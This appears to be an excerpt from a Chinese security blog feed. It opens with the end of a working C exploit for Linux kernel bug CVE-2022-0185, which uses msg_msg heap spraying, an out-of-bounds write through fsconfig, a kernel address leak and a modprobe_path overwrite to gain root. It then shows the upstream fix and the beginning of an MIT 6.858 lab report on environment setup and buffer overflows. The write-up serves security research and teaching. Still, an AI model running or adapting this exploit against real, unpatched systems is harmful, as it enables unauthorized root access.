(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (MSG_QUEUE_NUM / <span class="hljs-number">2</span>); i++) &#123;<br>        <span class="hljs-built_in">memset</span>(&amp;primary_msg.mtext, <span class="hljs-string">&#x27;A&#x27;</span> + i, <span class="hljs-keyword">sizeof</span>(primary_msg) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i],&amp;primary_msg, <span class="hljs-keyword">sizeof</span>(primary_msg),MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to send message!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* fsconfig() to set the size to the &amp;msg_msg-&gt;m_ts */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fsconfig() to set the size to the &amp;msg_msg-&gt;m_ts...&quot;</span>);<br>    fs_fd = oobWritePrepare();<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <br>             <span class="hljs-string">&quot;arttnbaarttnbaarttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-comment">/* spray msg_msg into the left half of message queues and seq_files */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray msg_msg in another half of message queues and seq_files..&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (MSG_QUEUE_NUM / <span class="hljs-number">2</span>); i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-built_in">memset</span>(&amp;primary_msg.mtext, <span class="hljs-string">&#x27;A&#x27;</span> + i, <span class="hljs-keyword">sizeof</span>(primary_msg) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i],&amp;primary_msg, <span class="hljs-keyword">sizeof</span>(primary_msg),MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to send message!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* oob write to overwrite m_ts of one msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] oob write to overwrite m_ts of one msg_msg...&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(m_ts_buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(m_ts_buf));<br>    *((<span class="hljs-type">long</span>*) m_ts_buf) = <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xff0</span>;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, m_ts_buf, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* spray more seq_operations */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray more seq_operations...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = MSG_QUEUE_NUM; i &lt; SEQ_FILE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* check for oob read */</span><span class="hljs-type">size_t</span> data_leak = <span class="hljs-number">-1</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for oob reading...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-type">ssize_t</span> rcvsz;<br>    <br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>        <span class="hljs-keyword">if</span> ((rcvsz = peekMsg(msqid[i], buf, <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xff0</span> - <span class="hljs-number">8</span> + <span class="hljs-number">0x10</span>, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] failed to read at %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to msgrcv(MSG_COPY)!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* normal queue, just ignore */</span><br>        <span class="hljs-keyword">if</span> (rcvsz == (<span class="hljs-number">0xfd0</span> + <span class="hljs-number">0x18</span>)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (<span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xfd0</span>) / <span class="hljs-number">8</span>; j++) &#123;<br>            <span class="hljs-comment">//printf(&quot;[----data dump][%d] %p\n&quot;, j, buf[j]);</span><br>            <span class="hljs-keyword">if</span> (buf[j] &gt; kernel_base &amp;&amp; ((buf[j] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x4d0</span>)) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] get data leak: %lx\n&quot;</span>, buf[j]);<br>                data_leak = buf[j];<br>                <span class="hljs-keyword">goto</span> out;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>out:<br>    <span class="hljs-keyword">if</span> (data_leak == <span class="hljs-number">-1</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to leak kernel info!&quot;</span>);<br>    &#125;<br><br>    kernel_offset = data_leak - <span class="hljs-number">0xffffffff813834d0</span>;<br>    kernel_base += kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] modprobe_path: %lx\n&quot;</span>, <span class="hljs-number">0xffffffff82891160</span> + kernel_offset);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitraryWriteByMsg</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> msqid, evil_file_fd;<br>    <span class="hljs-type">char</span> *nearby_page, *evil_page;<br>    <span class="hljs-type">int</span> msg_sz;<br><br>    msg_sz = <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0x18</span>;<br><br>    <span class="hljs-keyword">if</span> ((evil_file_fd = open(EVIL_FILE_PATH, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to open evil file in FUSE!&quot;</span>);<br>    &#125;<br><br>    nearby_page = (<span class="hljs-type">char</span>*) mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x1337000</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, <br>                               MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    evil_page = (<span class="hljs-type">char</span>*) mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x1338000</span>, <span class="hljs-number">0x1000</span>,  PROT_READ | PROT_WRITE, <br>                             MAP_SHARED | MAP_FIXED, evil_file_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (evil_page != (<span class="hljs-type">char</span>*)<span class="hljs-number">0x1338000</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to map for FUSE file!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(nearby_page, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br>    <br>    exp_fs_fd = oobWritePrepare();<br><br>    writeMsg(msqid, nearby_page - <span class="hljs-number">0xfd0</span> + <span class="hljs-number">8</span>, msg_sz, MSG_TYPE);<br>    <br>    munmap(nearby_page, <span class="hljs-number">0x1000</span>);<br>    munmap(evil_page, <span class="hljs-number">0x1000</span>);<br>    close(evil_file_fd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br>    <span class="hljs-type">int</span> seq_fd[SEQ_FILE_NUM], leak_msqid[MSG_QUEUE_NUM], shell_fd;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x2000</span>];<br>    <span class="hljs-type">uint64_t</span> *data;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] CVE-2022-0185 - exploit by arttnba3&quot;</span>);<br><br>    <span class="hljs-comment">/* create new namespace to get CAP_SYS_ADMIN */</span><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to unshare()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* to run the exp on the specific core only */</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-comment">/* register for FUSE */</span><br>    system(<span class="hljs-string">&quot;mkdir -p &quot;</span> EVIL_MOUNT_PATH);<br>    <span class="hljs-keyword">if</span> (fuse_main(<span class="hljs-keyword">sizeof</span>(evil_args) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>*) - <span class="hljs-number">1</span>, evil_args, <br>                  &amp;a3fuse_evil_ops, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to create FUSE!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* leak kernel base */</span><br>    leakKernelBase();<br><br>    <span class="hljs-comment">/* prepare file for triggering modprobe_path */</span><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/fake&quot;</span>);<br><br>    <span class="hljs-comment">/* prepare file for fake modprobe_path */</span><br>    shell_fd = open(<span class="hljs-string">&quot;/tmp/evil.sh&quot;</span>, O_RDWR | O_CREAT);<br>    write(shell_fd, cat_flag, <span class="hljs-keyword">sizeof</span>(cat_flag));<br>    close(shell_fd);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/evil.sh&quot;</span>);<br><br>    <span class="hljs-comment">/* exploit */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-type">int</span> flag_fd;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] trying arbitrary write for no.%d time...\n&quot;</span>, i);<br><br>        arbitraryWriteByMsg();<br>        system(<span class="hljs-string">&quot;/tmp/fake&quot;</span>);<br><br>        flag_fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDWR);<br>        <span class="hljs-keyword">if</span> (flag_fd &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Successfully overwrite the modprobe_path!&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03.漏洞修复"></a>0x03.漏洞修复</h1><p>该漏洞在内核主线的 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=722d94847de29310e8aa03fcbdb41fc92c521756">这个 commit</a> 当中被修复，主要就是将减法换成了加法，避免了无符号整型下溢的问题，笔者认为这个修复还是比较成功的：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/fs/fs_context.c b/fs/fs_context.c</span><br><span class="hljs-comment">index b7e43a780a625..24ce12f0db32e 100644</span><br><span class="hljs-comment">--- a/fs/fs_context.c</span><br><span class="hljs-comment">+++ b/fs/fs_context.c</span><br><span class="hljs-meta">@@ -548,7 +548,7 @@</span> static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)<br>       param-&gt;key);<br> &#125;<br> <br><span class="hljs-deletion">-if (len &gt; PAGE_SIZE - 2 - size)</span><br><span class="hljs-addition">+if (size + len + 2 &gt; PAGE_SIZE)</span><br> return invalf(fc, &quot;VFS: Legacy: Cumulative options too large&quot;);<br> if (strchr(param-&gt;key, &#x27;,&#x27;) ||<br>     (param-&gt;type == fs_value_is_string &amp;&amp;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;还是 mount 好&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://arttnba3.github.io/categories/CVE/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="CVE" scheme="https://arttnba3.github.io/tags/CVE/"/>
    
    <category term="提权" scheme="https://arttnba3.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>【EXPR.0x01】MIT 6.858 课程实验报告</title>
    <link href="https://arttnba3.github.io/2022/12/25/EXPR-0X01-MIT_6_858/"/>
    <id>https://arttnba3.github.io/2022/12/25/EXPR-0X01-MIT_6_858/</id>
    <published>2022-12-24T15:15:28.000Z</published>
    <updated>2023-05-31T10:39:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>感觉不如 CTF 7 天速成课程…画质…</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p><a href="http://css.csail.mit.edu/6.858/2022/">MIT 6.858</a> 是面向高年级本科生与研究生开设的一门关于<strong>计算机系统安全</strong>（secure computer security）的课程，内容包括威胁模型（threat models）、危害安全的攻击（attacks that compromise security）、实现安全的技术（techniques for achieving security）</p><p>在 YouTube 上有<a href="https://www.youtube.com/playlist?list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">往年的课程回放</a>，配有英文字幕，不过作为一个并非是对安全一无所知的安全小白，笔者主要还是挑自己不熟悉的那一块跳着听（笑）</p><p>这个课程一共有五个 Lab：</p><ul><li>Lab1：缓冲区溢出（buffer overflow）</li><li>Lab2：权限分离与服务侧沙箱（privilege separation and server-side sandboxing）</li><li>Lab3：符号执行（symbolic execution）</li><li>Lab4：浏览器安全（browser security）</li><li>Lab5：安全的文件系统（secure file system）</li></ul><p>前四个 Lab 主要是基于 MIT 开发的一个叫 <code>zookws</code> 的 web server 完成的</p><h2 id="PRE-环境搭建-amp-amp-说明"><a href="#PRE-环境搭建-amp-amp-说明" class="headerlink" title="PRE. 环境搭建 &amp;&amp; 说明"></a>PRE. 环境搭建 &amp;&amp; 说明</h2><p>这里给出三种搭建实验环境的方式</p><h3 id="Method-I-（推荐）使用-MIT-提供的-VM-镜像"><a href="#Method-I-（推荐）使用-MIT-提供的-VM-镜像" class="headerlink" title="Method I.（推荐）使用 MIT 提供的 VM 镜像"></a>Method I.（推荐）使用 MIT 提供的 VM 镜像</h3><blockquote><p>参见 <a href="http://css.csail.mit.edu/6.858/2022/labs/lab1.html">Lab 1</a></p></blockquote><p>MIT 提供了一个  <a href="https://web.mit.edu/6.858/2022/6.858-x86_64-v22.zip">course VM image</a> ，其中有着一个 Ubuntu 21.10 的系统，登录的用户名为 <code>student</code>，密码为 <code>6858</code>，下载解压后根据自身的本地环境进行对应的操作：</p><ul><li>使用 KVM 运行：直接运行 <strong><code>./6.858-x86_64-v22.sh</code></strong> 即可</li><li>使用 VMware运行：新建虚拟机→稍后安装操作系统→选择系统 <code>Linux &gt; Debian 9.x 64-bit</code> →移除原有虚拟磁盘→添加新的虚拟磁盘→选择  <code>6.858-x86_64-v22.vmdk</code> 即可</li></ul><p>对于非 X86 架构的处理器环境，<del>👴的建议是别做了</del>，在实验手册里推荐安装 qemu ，笔者就不摘抄一遍了</p><p><img src="https://s2.loli.net/2022/12/07/bjhUwo5k9q8EiTJ.png" alt="image.png"></p><p>当然没有图形界面只有一个 tty 比较难受，所以这里还是推荐用 ssh 连上去做，因为虚拟机在本地所以直接 <code>ip addr show dev eth0</code> 找到 IP 后 <code>ssh student@YOUR_IP</code> 就行：</p><p><img src="https://s2.loli.net/2022/12/07/MJcV1zZdS5NvnjE.png" alt="image.png"></p><p>之后还是按惯例把代码拉到本地，并使用 <code>make</code> 构建一下 <code>zookws</code> 看有没有啥问题，没报错就🆗：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> lab</span><br><span class="hljs-meta prompt_">lab$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><p>其中 <code>zookd</code> 负责接收 HTTP 请求，其由 C 编写，HTTP 相关的代码位于 <code>http.c</code> 中，HTTP 协议相关资料<a href="https://www.garshol.priv.no/download/text/http-tut.html">见此处</a></p><p>zookd 有两种版本：</p><ul><li><code>zookd-exstack</code>：栈具有可执行权限</li><li><code>zookd-nxstack</code>：栈不具有可执行权限</li></ul><p>用以进行评分的 <code>zookd</code> 位于 <code>bin.tar.gz</code> 中</p><p>此外，MIT 还提供了一个用以清理环境的 <code>clean-env.sh</code> 脚本，用以确保每次的执行环境都是相同的，我们可以通过如下命令运行 zookd：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd 8080</span><br></code></pre></td></tr></table></figure><p>之后我们便能在本地的 8080 端口访问到 zookd，直接进去大概会是这个样子：</p><p><img src="https://s2.loli.net/2022/11/29/KUG3v2uoqjm9nZg.png" alt="image.png"></p><h3 id="Method-II-自行配置本地实验环境"><a href="#Method-II-自行配置本地实验环境" class="headerlink" title="Method II. 自行配置本地实验环境"></a>Method II. 自行配置本地实验环境</h3><p>首先是配环境，除了 <code>pwntools</code> 是笔者个人比较喜欢的一个编写 exp 的模块以外其他都是实验环境必须的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo atp-get install -y curl strace lxc-dev</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pip3 install sqlalchemy pwntools flask z3-solver angr bytecode lxc</span><br></code></pre></td></tr></table></figure><p>之后还是按惯例把代码拉到本地，并使用 <code>make</code> 构建一下 <code>zookws</code> 看有没有啥问题，没报错就🆗：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> lab</span><br><span class="hljs-meta prompt_">lab$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><h3 id="Method-III-使用-docker-搭建实验环境"><a href="#Method-III-使用-docker-搭建实验环境" class="headerlink" title="Method III.使用 docker 搭建实验环境"></a>Method III.使用 docker 搭建实验环境</h3><p>因为评测用的二进制文件需要用较高版本的 libc（例如笔者用的就是 Ubuntu 20.04 with 过时的 libc2.31），同时也避免污染本地环境，因此使用 Docker 来完成实验也是一个需求项</p><blockquote><p>Dockerfile，注意替换上自己的公钥，如果没有从外部连接容器的需求的话这一步可以跳过</p></blockquote><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-comment"># basic environment</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="language-bash">    DEBIAN_FRONTEND=noninteractive \</span><br><span class="language-bash">    apt-get install -y git python3-pip tmux vim curl openssh-server strace gdb lxc lxc-dev</span><br><br><span class="hljs-comment"># sqlalchemy for lab, pwntools for my own</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip3 config <span class="hljs-built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip3 install sqlalchemy pwntools flask z3-solver angr bytecode lxc</span><br><br><span class="hljs-comment"># pwndbg for a better debug experience</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /root &amp;&amp; \</span><br><span class="language-bash">    git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> /root/pwndbg &amp;&amp; \</span><br><span class="language-bash">    ./setup.sh</span><br><br><span class="hljs-comment"># I&#x27;d like to make a new user for it</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd -m student</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> usermod -s /bin/bash student</span><br><br><span class="hljs-comment"># clone the lab</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /home/student &amp;&amp; \</span><br><span class="language-bash">    git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chown</span> -R student:student ./lab</span><br><br><span class="hljs-comment"># make your ssh key authorized</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/student/.ssh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;这里写你的ssh公钥&quot;</span> &gt; /home/student/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># start ssh service and keep container running continuously</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/bash\nservice ssh start\nsleep infinity&quot;</span> &gt; /root/start.sh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>因为实验要关 ASLR 所以我们在启动 docker 时需要 <code>--privileged</code>，不过因为只是实验用的容器所以无所谓，同时为了外网能访问到所以这里配了几个端口转发：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker build -t <span class="hljs-string">&quot;mit_6858_img&quot;</span> .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker run -d --privileged -p <span class="hljs-string">&quot;8080:8080&quot;</span> -p <span class="hljs-string">&quot;2022:22&quot;</span> -h <span class="hljs-string">&quot;mit_6858_docker&quot;</span> --name=<span class="hljs-string">&quot;mit_6858&quot;</span> mit_6858_img</span><br></code></pre></td></tr></table></figure><p>之后我们便能直接进到容器内部继续实验：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker <span class="hljs-built_in">exec</span> -it mit_6858 /bin/bash</span><br></code></pre></td></tr></table></figure><p>也可以通过 ssh 进行远程连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh student@your_server_ip -p 2022</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/03/RqEPmQyLzUskg4e.png" alt="image.png"></p><h3 id="EXTRA-vscode-连接"><a href="#EXTRA-vscode-连接" class="headerlink" title="EXTRA.vscode 连接"></a>EXTRA.vscode 连接</h3><p>因为我们的实验环境都有 ssh，所以直接用 vscode 通过 ssh 连接是非常方便的一件事情（容器配上端口转发也可以连接）</p><p> 首先在扩展里找到 ssh 插件并安装</p><p><img src="https://s2.loli.net/2022/12/03/VlTkD8N5BPFUq7v.png" alt="image.png"></p><p>添加 host 信息</p><p><img src="https://s2.loli.net/2022/12/03/U4ORh8JaWXulVB2.png" alt="image.png"></p><p>之后直接连接上去就行了</p><p><img src="https://s2.loli.net/2022/12/03/vNnUWPgELZIByY4.png" alt="image.png"></p><h1 id="0x01-Lab1-Buffer-overflows"><a href="#0x01-Lab1-Buffer-overflows" class="headerlink" title="0x01. Lab1: Buffer overflows"></a>0x01. Lab1: Buffer overflows</h1><h2 id="Part-1-Finding-buffer-overflows"><a href="#Part-1-Finding-buffer-overflows" class="headerlink" title="Part 1: Finding buffer overflows"></a>Part 1: Finding buffer overflows</h2><p>首先给了一个资料：<a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the stack in the 21st century</a>，基础薄弱的同学可以仔细看看，笔者这里直接跳过，然后是 Exercise 1：</p><blockquote><p><strong>Exercise 1.</strong> Study the web server’s C code (in <code>zookd.c</code> and <code>http.c</code>), and find one example of code that allows an attacker to overwrite the return address of a function. Hint: look for buffers allocated on the stack. Write down a description of the vulnerability in the file <code>answers.txt</code>. For your vulnerability, describe the buffer which may overflow, how you would structure the input to the web server (i.e., the HTTP request) to overflow the buffer and overwrite the return address, and the call stack that will trigger the buffer overflow (i.e., the chain of function 